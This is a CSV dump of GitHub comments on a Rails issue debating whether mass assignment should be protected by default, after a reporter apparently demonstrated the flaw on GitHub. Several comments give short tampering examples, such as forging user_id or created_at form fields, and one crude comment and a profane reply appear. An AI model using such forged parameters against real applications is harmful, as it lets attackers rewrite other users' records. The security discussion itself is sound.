rails/rails/5228/4261345,"I was thinking about generating something like this, unless you pass some kind of option to generator (sometimes you just want to skip  if you know what you're doing) ",,False,False,5228
rails/rails/5228/4261542,"@friend pointed me to #4062, there is a config setting that can do something like that . Although, based on that discussion I think that the consensus is that it should not be the default. ",,False,False,5228
rails/rails/5228/4263355,"so, here is what i came up to.  My main concern - is relations.  I hate the idea that some people could rewrite object references by themselves. Nobody should be able to set task[user_id]=hacker_id or sort of Vulnerable references are the main evil because 1) it totally ruins database and leaves no way to fix it back but backups 2) it works clearly. Hacked user won't be able to figure out ""Where is my blog post"" or ""How come this spam post is in my timeline written by me"" (if newpost[user_id]=target_user_to_hack) I suggest to have foreign keys and primary keys protected by default(what are keys can be recognized by ActiveRecord easily). IMO Rails should teach developers to set up so important and vulnerable keys by hands. It is not a handicap for prototyping, just +a few lines of code. But it is all about sane and safe rails apps. I've got a big picture in my head but the backbone is described above. I strongly believe that having keys(references, relations) will make ruby on rails a 20% more awesome. I mean robust ",,False,False,5228
rails/rails/5228/4263582,"Oh, didn't mention. On my part - I wouldn't support setting all attrs protected. It will cause such big mess! You cannot force every body to read release notes. Stackoverflow will be down. ] + it is dirty solution.  What also we have in model but keys? E.g.  title string  - not vulnerable at all, user is able to edit his comment rating integer - pretty vulnerable but not dangerous account integer - developer who left user[account] open for mass assignment should suffer. Nevermind about him. what else? Do we really need protected fields by default? No. ",,False,False,5228
rails/rails/5228/4269380,"@friend you dont like 'whitelist' idea - i dont too. But what is your opinion regards relation keys? They are obviously should be defined manually - in most cases. That is why having them protected by default is not a big deal.  And, surely, it should be opt-out-able, e.g.  config.active_record.protect_keys = true ",,False,False,5228
rails/rails/5228/4281034,Just imagine which power this vulnerability gives in my.. and now in your hands if you get what has happened.  @friend @friend  Y you no care trollface ,,False,False,5228
rails/rails/5228/4285863,"There're too much trolling going on in this ticket and I'm not sure anymore if you mean anything serious. If you're going to do a bug report or feature request, just stop trolling and try not to be annoying, then the core team will come and check out by themselves. Name calling while trolling doesn't help, trust me. ",,False,False,5228
rails/rails/5228/4286254,"@friend bugs are serious. This is not only bug report, because this problem is so wide spreaded. postereous, speakerdeck, scribd, github - and I only have started testing. We need to introduce blacklist attributes. MOst of rails apps(from small to github) likely got mass-assignment bugs if they don't user attr_accessible. I just want to attract more attention to reviewing this problem from scratch and calmly decide - what should we do with M As-ment problem. And, if some of you support my idea I could provide fixing pull request. But you ignore this bug, like nothing has happened for a long time. SOrry for not called for trolling, I overplayed ) Everyone, again, express your point please, you are welcome. ",,False,False,5228
rails/rails/5228/4290842,There was a proposal about changing that flag in #4062 and the consensus is the pros of the default configuration outweigh the pros of the alternative. Thanks! ,,False,False,5228
rails/rails/5228/4292105,"@friend have you read my post? Did you see vulnerabilities i pointed out in e.g. github? It is not about the flag in configuration, I'm pretty certain. We need to have created_at, updated_at, and references to be protected by default. Whitelist issue has nothing to do with my point Please read issues carefully, because I clearly emphysized that flag is not a panacea ",,False,False,5228
rails/rails/5228/4292532,"What I want you to see in that thread I mentioned is the way the core team perceives this. You are not discovering anything unknown, we already know this stuff and we like attr protection to work the way it is. ",,False,False,5228
rails/rails/5228/4292849,"look. this is github, written on rails.   as you see github is vulnerable. Because gh devs are bad? Or who's in charge? Rails are in charge, and blacklist of custom [created_ate, updated_at] is the least we MUST do Really, is there any case when user should be able set created_at by himself? It is timestamp! Why I can set it using just &lt;input name=model[created_at] value='1987...' ?  Again, let's talk about certain vulnerability-case. created_at MUST be protected by default. Am i right? ",,False,False,5228
rails/rails/5228/4300062,"Rails is not in charge, it is your responsibility to secure your application. It is your responsibility to avoid XSS, to ensure that the user is editing a resource that belongs to him, etc. Rails, however, does a lot of effort to assist you in securing your application as much as it can. That's why you have some protection measures built-in. I don't think we need to special-case anything. The user has a flag to secure by default, I personally think that is enough. I see little benefit in special-casing the timestamps if you have the flag set to false. And I am totally -1 in doing anything fancy with foreign keys because they have of course valid use cases where users can set them. ",,False,False,5228
rails/rails/5228/4300754,"Perfect response. Rails are not in charge - my question was like, 'why is that'. Surely nobody is fully in charge. But only rails apps got this kind of bug. Yeah, phpists never got so fast prototyping tools so most of them cannot even dream about update_attributes {} and form generation too. Rails has very convinient tools, I agree! attr_accessible is good and must thing for every developer. But for now we got it too unknown. Most of middle level developers forget about the meaning of this tool. Mixes with attr_accessors in ruby itself - so their model gets very unsecure. So you only a little bit support special casing of timestamp.  For first view at the problem of timestamp-overwriting it doesn't seem fatal. But when I have issue/comment written in 3012 year I at least have it number 1 in any timeline orders. That seems ugly to me so I am keen to special case timestamps. Regards foreign keys - I  didn't get why you are ""totally"" -1, and if you got spare time please give me valid use cases if you know some. That will help me in understanding your point fully another way to decide problem - populate using of accessible. Include it in scaffold generated output for model files. Im  pretty sure rubyists will care much more having these lines and one day 4/5 will know+use this declaration. (now 4/5 don't either know or use, that's sad) ",,False,False,5228
rails/rails/5228/4303341,"@friend I also don't like the idea of doing anything automated with foreign keys or timestamps. That way, people that does not know that they need to use some kind of params protection will be secure in those 2 cases, but it will fail with any other critical field, let's say . @friend what do you think about generating a model class with a comment describing attr_accessible and giving example, something like ",,False,False,5228
rails/rails/5228/4304367,"@friend  it is your viewpoint. Ok, let's not bother junior devs who will need to think about protection.  But I like your proposal regards model generator. I suggested it as an alternative, this fix will satisfy me. ) ",,False,False,5228
rails/rails/5228/4311450,"It's 2012. When will people stop believing in ""blacklists""? The default has to be restrictive and the developer has to make sure she/he does acceptable exceptions. It's like with the XSS/sanitize stuff. It will never work the ""blacklist""/""developer should care"" way, imho. At least throw a warning into the debug-log when a model has no attr_accessible defined at all... ",,False,False,5228
rails/rails/5228/4311476,@friend Is this how you added  curious. ,,False,False,5228
rails/rails/5228/4311510,@friend plus one Rails is all about conventions. Broken by default is not a good convention. ,,False,False,5228
rails/rails/5228/4311527,"@friend Man, you look like a kid that wants some attention. Stop trolling and make GitHub a favor — file a private bug request via contact form — that's how non-douchebag people do. I totally agree with @friend — missing  is not Rails' fault but developer's mistake. Generated models could have a friendly comment like @friend said, but in practice I think we don't use generators that much, I thought that's easier just to type . ",,False,False,5228
rails/rails/5228/4311539,"@friend don't shoot the messenger, dude. ",,False,False,5228
rails/rails/5228/4311543,"@friend what you say? Every book, every tutorial, every guide tells developers to use generators. Do you create all the test + migration files by hand?! ",,False,False,5228
rails/rails/5228/4311548,"@friend I might have a bit overreacted — apologies for that. Yet I think giving one example of vulnerability is enough, no need to go through commits and issues over and over screwing things up. ",,False,False,5228
rails/rails/5228/4311581,"@friend is right, though. Zero-day attacks are a completely inappropriate way of raising awareness of a vulnerability. ",,False,False,5228
rails/rails/5228/4311587,"@friend I use generators on prototyping stage extensively, but then it simply gets too custom and often beyond scaffolds. It depends on a dev though. ",,False,False,5228
rails/rails/5228/4311602,"@friend it's primarily a model issue, not a scaffolding issue. attr_accessor is defined inside a model, not in a controller. 100% of all developers I've worked since 2007 use generators to create models + migrations. ",,False,False,5228
rails/rails/5228/4311604,Two security issues concern me about Rails 1) The defaults not being restrictive 2) Lack of any certification for Gem distribution (imagine if someone got a commit in to some of the most popular gems) ,,False,False,5228
rails/rails/5228/4311632,@friend rubygems does not even have a popular self-signing implementation as most cpan modules (perl) use. So you can't be sure the gem you've downloaded is the one the author made (not the CIA or another MITM).  1.77 was released iirc around 2002/2003) ,,False,False,5228
rails/rails/5228/4311662,"@friend RubyGems supports gem signing, I use it for a client of mine  the other hand, 99.999% of gems don't use it -) ",,False,False,5228
rails/rails/5228/4311673,"@friend iirc only when explicitly specified on the cli (what about bundler?) and as you said....""not very well"" adopted. ",,False,False,5228
rails/rails/5228/4311723,"In this thread core rails devs get egg on their faces for ignoring a fundamental security concern, and then proceed to complain when the reporter 0days GitHub. ",,False,False,5228
rails/rails/5228/4311745,Rails devs are not responsible for Rails-powered sites. It's not their fault. ,,False,False,5228
rails/rails/5228/4311771,See  for my proposal for how to improve the situation. ,,False,False,5228
rails/rails/5228/4311773,"@friend I don't think that's completely correct, the fix presented in this issue is exactly what the Rails core devs could do, to assist the novice Rails devs. Convention over Configuration means that the Rails devs are actually partially responsible for Rails-powered sites because they establish the convention. ",,False,False,5228
rails/rails/5228/4311777,@friend Proposal for Improving Mass Assignment - ,,False,False,5228
rails/rails/5228/4311799,@friend A framework's responsibility is to help programmers write better quality applications. ,,False,False,5228
rails/rails/5228/4311804,Not to mention that  shouldn't be in model... ,,False,False,5228
rails/rails/5228/4312751,"It's a worrying issue, made all the more worrying in that I had no idea it existed. I know that the Rails Guys don't see this as a big deal, but I'd ask them to reconsider. This issue affects a lot of projects. I've added ""disable_mass_assignment"" as per the following link and I'm updating my codebase. FWIW, it's a pretty quick job to search for affected fields and add them to the model.  not 100% sure what the ramifications are for models which have different rights according to a user level, but I'll be investigating. One Quick Suggestion  When Attr_Accessible is switched on, the error you get looks something like ... ""Can't mass-assign protected attributes email, name"" Maybe this could be changed to   "" Can't mass-assign protected attributes email, name Add following to your model ( to allow these to be edited in forms Attr_Accessible email, name "" I believe the code to protect the fields should be in the model. I think model attributes should come with security baked in. Not 100% sure how this would work, but it makes the most sense to me. ",,False,False,5228
rails/rails/5228/4313392,"From homakov ""@friend @friend Y you no care"" Does this guy have to send a teddy bear &amp; flowers? If someone tells me ""Hey you got a severe hole in your app"", and I ignore him, and that hole is then exploited by Anyone (him included), I am to blame.  Someone who cracks my app is an ""a$$hole"", but if they tell me first, and then only crack it to illustrate their point... no.  I am wrong. ",,False,False,5228
rails/rails/5228/4313545,"@friend his ticket has not been ignored, hasn't it. We disagree about his proposal, which is different. Rails applications have a configuration flag that forces you to declare accessible attributes, the support to prevent these kind of issues is builtin. ",,False,False,5228
rails/rails/5228/4313803,"Bravo to @friend! What's the shame! When 90% rails apps in the world are vulnerable, ""core team"" says ""We disagree about his proposal"". I have just one question is this framework for ruby developers or only for such ""professionals"" from ""core team""? Open source is so open source in this project... ",,False,False,5228
rails/rails/5228/4314047,"@friend this proposal would not automagically fix any existing app - it's up to developer to say which fields are protected, there is no easy way to guess that. This can be a problem in all frameworks that allow mass assignment. That said, I'm sure that this needs some farther discussion, but automagically fixing some fields is not an answer and will just not work in practice. ",,False,False,5228
rails/rails/5228/4314106,"Also, for what it's worth, I proposed a temp solution to raise awareness by adding comments to generated models, to which @friend responded ""1 day ago"" ",,False,False,5228
rails/rails/5228/4314205,"Dear Rails people, Have you learned nothing? ""Insecure-by-default"" means ""insecure"". Trusting the programmer to fix things up and make them secure has never worked. You guys have reinvented strcpy(). Way to go. ",,False,False,5228
rails/rails/5228/4314271,"@friend in my opinion, if you don't know how can you handle this automatically, force developer to choose correct option. With current defaults, developer sees ""ok, everything works fine"", and he won't read next chapter about security, he doesn't understand how dangerous can it be! Every wi-fi router after you entered predefined password says ""it's dangeous to use predefined password"", when you login to some admin console with predefined password it says ""You are using default password. Please change it."". You aren't warn that it's dangerous. I believe the problem is the bug was closed after your comment and no new one is created. I think you would like to bury it under show, but thanksfully @friend done the thing that won't be forgotten for a long time ;) ",,False,False,5228
rails/rails/5228/4314316,"@friend seriously? please don't create any conspiracy theories. The first closed/open thing was done by accident, I reopened ticket seconds later. ",,False,False,5228
rails/rails/5228/4314329,"For what it's worth, I have commented about this ticket at ",,False,False,5228
rails/rails/5228/4314470,"@friend ok, sorry, I didn't notice that you're reffering to the other issue, not this one, frankly I missed the magical reopening. I passed it to github guys and closed as was not adding anything into discussion - @friend proved that github is vulnerable and it's referenced here. ",,False,False,5228
rails/rails/5228/4315699,"@friend wasn't trolling. It's a language barrier filled with relating to memes. His intentions were pure and good. Maybe didn't solve it the best way, but he got the attention and now a proper response. @friend solution is a great one. ",,False,False,5228
rails/rails/5228/4316760,Nobody here sees the irony in Rails redoing what PHP was ridiculed for for so long? Never. inject. user. input. by. default. ,,False,False,5228
rails/rails/5228/4317388,"Imo this whole (mass) assignment protectecion does not belong to the model at all, it's a controller thing. I already created an issue for this months ago ",,False,False,5228
rails/rails/5228/4317692,"github owes @friend an apology. a proper one. and the ones who tried to dismiss him because he doesn't write proper english, should do it in russian. ",,False,False,5228
rails/rails/5228/4317753,"Nice one @friend Well pointed. GitHub jeez, unblock the man's account! ",,False,False,5228
rails/rails/5228/4318232,"We should actually be grateful to @friend for bringing this known but not sufficiently addressed problem to attention. Rails should of course be secure by default. Analogous to the XSS situationwe should not allow an insecure (tainted) params hash to be passed straight into our db API, thats almost as bad as being open to SQL injection. The whitelisting/filtering belongs in the controller. Since both @friend and @friend seem to share this view there is a good chance we will get a proper fix in Rails soon. ",,False,False,5228
rails/rails/5228/4321288,"The entire idea of Rails is to make an application extremely hard to hack even when the programmer has little to none security expertise. Expecting people to fix this themselves is plain silly and goes against the rails way in my opinion. IMO, the entire mass assignment idea should not exist - its way to dangerous and and has no room for error. ",,False,False,5228
rails/rails/5228/4321374,"@friend I thought the entire idea of rails was to make it easier to build applications, to focus on what your application actually does without having to worry so much about how it does it (at the lowest levels, at least). There's an entire guide explaining how to secure that application once you've built it (or even while you're building it). I agree that certain things (like mass-assignment security) should be enabled by default, but I wouldn't go as far as to say that's the ""entire"" idea of Rails. ",,False,False,5228
rails/rails/5228/4321543,@friend True - but with one comes the other. Applications get easier to build when you do not have to invest so much time into securing your applications. Rails is also forcing people to think with a certain mindset (which makes you a better programmer in the end). Junior/mid-class developers see that something works with Rails and they think that's it. When you force mass-assignment security - they realize their code is not working and must assign the attributes - you force them to think about security. Starting rails developers should not learn about these issues by having their entire project exploited IMO. Perhaps its not the entire idea of Rails - but Rails already got so much out of the box security build in its certainly a very big part of it. ,,False,False,5228
rails/rails/5228/4321572,"this is an interesting ticket, it's like ""close the security hole"" ""no, we want developers to close it themselves"" and then they continue calling it a philosophical disagreement after the bug tracker itself is hacked ",,False,False,5228
rails/rails/5228/4321701,"@friend Oh, I agree, I just wouldn't go as far as saying that's the entire idea of Rails. Personally, I think the best solution would be to immediately release an update that takes one of the approaches given in the first two comments by @friend on this ticket. Either set attr_accessible to nil on ActiveRecordBase or set config.active_record.whitelist_attributes to true by default. Either of these forces safe and sane mass-assignment by ""breaking"" the app if your models aren't safe. I put ""breaking"" in quotes because, realistically, if this one change causes any kind of breakage in your app then it was already broken anyway. ",,False,False,5228
rails/rails/5228/4322793,Hmm can someone summarize the discussion? Did anybody agree on something? ,,False,False,5228
rails/rails/5228/4323000,"When I first saw , I already knew it's vulnerable and nobody should write like that. However, this approach is widely used in all Rails guides, and so insecure. Mass-assignment should be disabled by default. ",,False,False,5228
rails/rails/5228/4323285,-1 to response from rails team. ,,False,False,5228
rails/rails/5228/4323313,@friend Java-based frameworks are not the answer. They can be pwned too. Take any Jersey app with Spring integration and do the same thing. The only difference is you may have to work a little harder at guessing some of the attributes. I think it's funny that junior/mid-level programmers are being called out so much in this thread. Surely the engineers at GH are not all junior/mid-level guys. Maybe they are and I am just naïve. ,,False,False,5228
rails/rails/5228/4323438,"I do not think mass-assignment should be disabled by default, but must be disabled on production environment by default. I think this is a good compromissum between developer needs and production security. About filtering what @friend suggested, I think some similar. First, there is need a way to instruct the framework to filter it by default then it needed to be enabled in production mode. I understand every developer is responsible for its stuff but I do not agree why Rails does not help for make its application more secure. Rails is designed with some security solutions, like CSRF stuff and basic protections against XSS. I do not think why we cannot do more step on that way, and make models secure by default. If it is planned well and configured well, then it should not be a pain in the ass. Who needs the original function, they can disable this feature. ",,False,False,5228
rails/rails/5228/4323627,"@friend my comment above is not fully accurate. I should have said, ""Take any Jersey app with Spring integration where the services interact directly with the entities..."" I have seen many Java programmers do it. ",,False,False,5228
rails/rails/5228/4323994,It was forced! 6dd6816ce337322e7c267ab1158ac8c80588ccd6 ,,False,False,5228
rails/rails/5228/4325666,THIS ,,False,False,5228
rails/rails/5228/4326733,"Protecting attributes from within controllers sounds like a setup to have multiple points of fault.  If I have more than one controller making saves/updates on the same model (ignoring a debate over if that is good design), then I have to remember to protect attributes in multiple controllers.  If I handle mass assignment from the model, there's a single, definitive barrier between submitted params and persistence, irrespective of where that data originated. ",,False,False,5228
rails/rails/5228/4327289,"@friend exactly. That's what I tried to say dhh in my gist. Controller has nothing to do with unintended params. It doesnt filter. It handles, manages, controls business logic.  IMO You should write your controllers way described below 1) have all critical fields protected/updateable - accessible 2) control saving new record in controller using role checks, dependencies and abilities. Not just by filtering user_id 3) Never simplify business logic for ""update"". People got role checks in ""create"" but trying to manage just ""update_attributes"" in edit and that's why this has happened. If you check role - check it on create and on update. Don't be lazy. sic! ",,False,False,5228
rails/rails/5228/4328337,"@friend I see your price-list updated on your site D. With you are skills and rails knowledge, you are asking for a junior dev salary in us. ",,False,False,5228
rails/rails/5228/4329097,"@friend, what if you protect those attributes in , which all other controller inherit from? This would allow you to still set all attributes in your test cases, and you would protect against having multiple points of failure. ",,False,False,5228
rails/rails/5228/4329211,"Probably you can make a branch like ""rails_for_developers_that_doesnt_read_documentation"" and in that branch you can take off update_attributes, and there you will have a ""secure"" rails framework for people complaining about this issue ) ",,False,False,5228
rails/rails/5228/4329564,@friend plus one Exactly what I thought. This is a new register_globals. Unbelievable. ,,False,False,5228
rails/rails/5228/4333203,"FWIW, this behavior isn't unique to Rails.  Or, to be more specific, it isn't unique to ActiveRecord.  If you were to look at other ORMs/ODMs, such as DataMapper, Sequel, MongoMapper, or Mongoid, you could see that mass assignment was allowed by default on any given model, and can be adjusted using a whitelist (or sometimes a blacklist) class method. I don't see anything wrong with this per se.  To disallow mass assignment by default would be a safer default, but it also makes the assumption on what you're doing in your application, and what does and doesn't need to be secured from user tampering.  But it also requires you to be aware of the potential security concern to begin with and be thoughtful of it when designing your models. ",,False,False,5228
rails/rails/5228/4333899,"@friend If somebody develops an application what will be available from internet for a wide publicity, then it must be protected on all way. I wouldn't like point to GitHub issue what happens if application is not protected. You cannot trust in the internet. If you are a beginner, then read the f_ing manual to yourself, and again, and again, until you understood the security is not an option, but a requirement for your application. I understand some ORMs does not enforce this security setting by default but this page is not an issue page for Mongoid, Sequel, or DataMapper, but it is an issue page for Rails, or to be more specific, for ActiveRecord.. If other ORMs decide make a possible security hole on a non-careful developer's code, then this is their own decision, not the rails developers' one.  Because somebody decides he jumping from the rock without a rope, we do not need to follow that example. We can attach ourself to a rope, and we currently doing it. ",,False,False,5228
rails/rails/5228/4334145,"There was one problem with this option it wasn't promoted enough. I never saw this option in the generated default config files, and if this (and GitHub) issue does not points me to it, I never set it, even if I use  in my applications. Promoting the security is a very high priority communication job, if there is one channel where we can do it, we need to do it. ",,False,False,5228
rails/rails/5228/4335260,"@friend You can't protect the user from everything. Having all attributes blacklisted is arguably a safer default, as I said.  It nonetheless makes assumptions about the application.  There might be no need for certain applications (which might not even necessarily be ""web apps"" per se) to have all attributes blacklisted by default.  Some users might even find such a default more burdensome than helpful, depending on what their use case is. The irony of your ""read the f_ing manual"" statement is that the lack thereof is part of the problem here.  Users aren't protecting their attributes either out of ignorance or oversight.  And to be fair, maybe the vulnerability isn't stressed enough in the documentation.  (I haven't looked.)  I'm not arguing against trying to mitigate potential disaster -- I'm all for it -- but I would also argue that if one doesn't truly understand why mass assignment is disabled by default, then he or she is liable to make their models insecure no matter what. And for the users who are truly oblivious, here's what's going to happen anyway ""I can't set  from this form.  Let me just add  to the  array, because that's what will make this action work the way I want it to."" That user doesn't understand what  is for, why they'd want to whitelist attributes, why they need to whitelist attributes, and what can happen if they whitelist the wrong attributes.  They might not even understand that they are whitelisting attributes -- they might think  is some kind of riff on  that adds getters and setters based on their schema. At best, we're really just going to make it a little more difficult for them to screw themselves.  Defaulting to a blacklist is an improvement to security, but no panacea.  And I guess that's what I was getting at in my previous posts.  It seems like some people are mindblown by all this, like allowing you to protect your attributes but not doing it by default is just nuts.  We can go ahead and improve it, but there's still a dozen other gotchas awaiting the unprepared developer. ",,False,False,5228
rails/rails/5228/4336628,"@friend To be fair, this sorcery also made assumptions for all our Rails apps (for security reasons) 9415935902f120a9bac0bfce7129725a0db38ed3 If you're going to do this (setting ) without knowing what it does, and you can't be arsed to look it up because you're too lazy, then you deserve to get ""hacked"". At this point, the average developer would look up what this does unless they already know, and understand what it's for. The first thing I pop in to the model when I create one is the  method, just to ensure I don't forget, because I likely will since I'm busy implementing other things. Even if you know it exists, like GitHub, apparently even skilled programmers get screwed by Rails' defaults. Thankfully @friend isn't an asshole, but assume he was, he could've done A LOT of damage with automated scripts to GitHub. Also, if this unprepared developer runs in to a lot of gotchas because of having to whitelist stuff, that's good, he or she will learn from them, best way to learn is trial and error. But at least he/she (unless he/she is a total noob, and cba to read docs to clarify what certain things actually do when in doubt and actually uses it wrong) won't be screwed the way GitHub was. Obviously GitHub is at fault here though, not Rails. When I heard the news about the mass-assignment issue + GitHub I thought people were trolling, before I actually read about it. I don't really care whether  blacklists everything by default or not. But from my point of view, by not having it as the default, it has the potential to cause a lot of damage to even experienced developers. Perhaps it's possible to have it on by default, with a flag in  to disable it if it isn't necessary, or the other  way around, since everyone does stuff in the  anyway and will see the option and be like ""oh yeah, *flags it*"". Might just go ahead and do this to be safe Just my two cents. ",,False,False,5228
rails/rails/5228/4339510,"@friend I like what you say about controllers handling, managing and controlling business logic. Code runs faster in controllers than in models. The TDD fanatics like to put all business logic in the models because it is easier to test, but they apparently don't care about how fast it runs (the client can pay more for that later.) But I disagree about not filtering data in controllers. When you are working with complex data relationships, it may be necessary to place some of the filtering logic in the controller; but that logic is the app developer's responsibility, no special rails constructs are required. People need to realize the examples, even in the books, are simplistic. But sure, why not blacklist all mass assignment and require the dev to use attr_accessible, nothing wrong with that. ",,False,False,5228
rails/rails/5228/4340406,"@friend Well done ) It's github's admins fault, the man did all he could. It's time people start listening when things like these come by. Again, well done, fully applaud. ",,False,False,5228
rails/rails/5228/4340407,"Agreed.  Sorry, but all this nonsense about blacklisting by default being annoying is ridiculous.  If attr_accessible is the ""smart"" way to go, then devs should be forced (at the very least encouraged) to use it. On the off chance that they're creating something that requires absolutely no security (seriously?!?), they can deactivate the blacklist for themselves. ",,False,False,5228
rails/rails/5228/4340498,"Rails is about reasonable conventions over configuration. Reasonable being the key word. In this case @friend proved your conventions are not reasonable. And you ignored him. Lesson learned don't trust rails conventions, they are not reasonable, so if what you just coded works, now sit with the documentation, read it all and check all possible options to find out what do the rails dev's screwed and fix it; if you fail to do it and trust their conventions, they will tell you it's your fault. It was foolish to turn @friend away. Just don't goon wit it. BTW I use the attr_accessible and attr_protected in my apps from the very beginning. Anyway I support what @friend proposed. ",,False,False,5228
rails/rails/5228/4341128,"@friend @friend was said all argument what I would like, so I would like to reply to just this This is absolute true. But, as a framework developer, I can protect my users from security problems caused by framework if it is possible. Developers are not a secretaries or nurses to I shouldn't assume they can't solve their problems but if I can help them to write better and more secure application then I must do it. ",,False,False,5228
rails/rails/5228/4341145,"Take a breath, and think naturally... In life, people consciously and loudly choose to tote themselves in the nude.  Even simple fashion is considered a statement attr_accesible birthday_suit # read wildcard/regexp attr_accesible keg, midriff, sixpack, love_handles attr_protected sun_dont_shine, knockers, lingere, knicker_bockers attr_protected bunny_suit # read put the hazmat on the bunny  This is an issue of avoiding the dreaded nipslip or more poignantly protecting baby developers from rapists and pedophiles. Seriously, how much can you expect from a five-month-old? Consider another analogy between escaped strings (which Rails quite aptly handles) and consumables. Cereal and arsenic shouldn't mix; medicines are proscribed by experts; and the LSD's for the adventurous. In the end, you choose, but you can't just allow anyone to shove anything into any orifice. Sensible conventions reflect how we think, and thus make languages like Ruby and fameworks like Rails so wonderfully appealing and empowering. Flexibility shouldn't be compromised, of course I'd be pissed if I had to fight to dress myself. But keep the infant in his diapers and sew the long-forgotten crotch holes in your buddy's pants (coughgithubcough.) After all, mistakes are only human. ;D ",,False,False,5228
rails/rails/5228/4344920,"i think instead of fighting, rails people should find a nice solution for this problem. please ",,False,False,5228
rails/rails/5228/4346739,"Solution is in the repo, forcing security is enabled by default. ",,False,False,5228
rails/rails/5228/4349950,"Couldn't rails automatically use the input fields declared within the form_for block to determine what fields are allowed to be posted?  This could be implemented by automatically inserting a special key at the end of the form, then the controller could only allow the declared parameters through to the actions. ",,False,False,5228
rails/rails/5228/4350257,"Would it be possible to encode the ids of every element in the form?  Using sha1 or something like that.  The form could also contain something that would assist in the decoding of the ids.   The helper methods (form_for , text_field) would handle the encoding and the controller would automatically decode the params,  so it would be transparent to the user. ",,False,False,5228
rails/rails/5228/4351018,"@friend No, it is not possible, because the  attribute what is really matters. And it is needed for compute params array. And from SHA1 you cannot decode anything, because you do not needed to name your form elements as same as attribute names - it is just a help for you. But, the form-decoding logic is cannot guess what do you want to get in your form, and if the choosen encoding is decodeable, then hacker can decode it relative easily - so it is not a protection, but security through obscurity - not needed, unusable, and does not matter. And form_for is just generates a HTML form. It is not related to handling incoming parameters. And,you cannot restrict incoming parameters on the level of  framework, because it is an application-dependent thing. ",,False,False,5228
rails/rails/5228/4351960,"On 06.03.2012 2017, Gabor Garami wrote I think he meant attaching a kind of control sum to each form, to allow controllers to automatically verify if there were any additional fields added to the form by an attacker. --  wrzasa &lt;Q&gt;&lt; ",,False,False,5228
rails/rails/5228/4367586,"Can someone please point out to me a reasonable use case, for a web application, when you don't need to make sure your POSTed data is exactly what you're expecting? I seem to see people think there are cases where not being forced to be explicit about what you allow, would be... needed, apparently. I'd appreciate a case. ",,False,False,5228
rails/rails/5228/4368197,"On 07.03.2012 1400, Norv wrote There are cases when you don't care, because your model contains only the fileds that the user is allowed to edit, so an attacker would gain nothing. This is the only use case at least loosely connected with what you asked. I can't see any other. Your question is even more important in case of RoR where my use case is never true, becasue every model contains at least updated_at and created_at and in most cases no user should be allowed edited them. ",,False,False,5228
rails/rails/5228/4369081,"@friend In the real world, there aren't a lot.  One exception is where the data is coming from a ""trusted"" user, e.g. an admin.  Sure, maybe there's fields you want to secure even from an admin, or maybe not, or maybe you just figure it doesn't matter if they want to hack their own app, if they want to go to those lengths. However, not every model deals with POSTed data, and some do but only indirectly. For example, a project I work on imports XML data from a ""trusted"" source, so in these kinds of models, there's no need for security.  There are numerous models in the project like this.  I'd essentially have to attr_accessible every last column, if the default were for all attributes to be blacklisted by default.  This is somewhat arduous, and is somewhat of a maintainability headache, because if the schema changes later on, I have to add those new fields to the attr_accessible list. If we're going to go with a blacklisted-by-default approach, is there some way for me to auto-whitelist every attribute without having to be so explicit as to type out each one? ",,False,False,5228
rails/rails/5228/4374607,"Probably a simple configuration should be enough blacklisted-by-default , a config to change it to whitelisted-by-default and the option to change it directly in the model at run time. I don't see the problem really and rails has just maked a fool of itself... PD If you advertise you framework as ""even an idiot can make a page in 30 minutes"" you will end up with a lot of idiots writing pages in 30 minutes... ",,False,False,5228
rails/rails/5228/4376084,"To me it seems obvious from the start that mass assignment should be disabled by default. Otherwise, you add a field on a table, and you have to remember to block it on the model? If the field would be user-assignable, then of course a form would have to be modified to add an input, and at THIS time, you would modify the model, because it is related to the same change. Yii framework in PHP which is very similar to Rails, blocks alls fields by default since the beginning. If this is common practice in the Rails community, I would never trust a Rails application. This is as bad as SQL injection. ",,False,False,5228
rails/rails/5228/4376882,"Just received an email from GitHub, perhaps related to this issue ""A security vulnerability was recently discovered that made it possible for an attacker to add new SSH keys to arbitrary GitHub user accounts. This would have provided an attacker with clone/pull access to repositories with read permissions, and clone/pull/push access to repositories with write permissions. As of 553 PM UTC on Sunday, March 4th the vulnerability no longer exists."" ",,False,False,5228
rails/rails/5228/4391198,"Thank you! @friend I was going to point out the commit above - cjcsuhta already mentioned it. Reversing the switch is possible, for one's particular application. The possibility of different sources for the data getting to the model, than http form input, and needing different treatment for them, tells me again that authorization, filtering of the incoming data, and even validation needed for the data, are not really model issues. They may apply on the model, or be aware of it, but they cannot and should not be handled all at model level, otherwise you can't really have flexibility nor security as needed. The handlers of those actions (i.e. controllers, forms, actions classes) should be responsible, directly or indirectly. On the other hand, since in the case of web form data, there is an always-present need for request filtering, authorization, and validation, I find it more than reasonable to address these concerns at the level of a web framework. If it's at the expense of convenience, then at the expense of convenience. Security &gt;&gt; convenience. At most, validation, from this list, may be disputable as to where it belongs, it may be the choice of a particular framework to handle it more tied to the model itself. I just don't see how could the rest be model matters, and in the same time have a both flexible and secure framework for development. (Nevertheless, the commit pointed out above is IMO a step in the right direction, at least it makes sure the defaults will be saner). Side note I'd say admin is not really an exception in the sense of my question, since checking if the current user is an admin means an authorization check. ",,False,False,5228
rails/rails/5228/4469007,"@friend Congratulations, your name is now on the media ",,False,False,5228
rails/rails/5228/4530081,"We developers using Rails should not have to write Merb or 0day the repo in order to get core Rails devs to stop saying ""The emperor DOES SO have clothes!""  Core devs, please change your attitude.  We want newly-generated rails apps to have a setting in the application.rb that by-default turns off mass assignment, unless we reverse that setting in the application.rb or on a model by model basis.  This way it's backwards compatible with existing apps too.  Most of us want this.  Stop making us resort to such tactics for anyone on the core team to listen. ",,False,False,5228
rails/rails/5228/4539120,"@friend you knocking on the open door. Please read back this issue, the future Rails versions will come with enabled enforcement. ",,False,False,5228
rails/rails/5228/4550932,"@friend indeed, for this issue... but will our attitudes change enough from this experience so that such tactics won't be necessary with other issues?  I see the attitudes as the root cause that made this issue go so long ignored.  And I realize this is more a social thing than a technical thing, so maybe this isn't the right forum for me to keep talking about it, sorry P ",,False,False,5228
rails/rails/5228/6222985,"Isn't the question of whether mass assignment is enabled or disabled by default a bit of a red herring? I've just posted a question to this effect at SO, if anyone's interested. ",,False,False,5228
rails/rails/5228/6223270,@friend Answer is No. User is able to update HIS public key record AND he updates it with new user_id. code ,,False,False,5228
rails/rails/5228/450526128,"@friend What the fuck, why are you on about babys, rape and pedophiles you sick fuck. oh my god people are so weird nowadays ",,False,False,5228
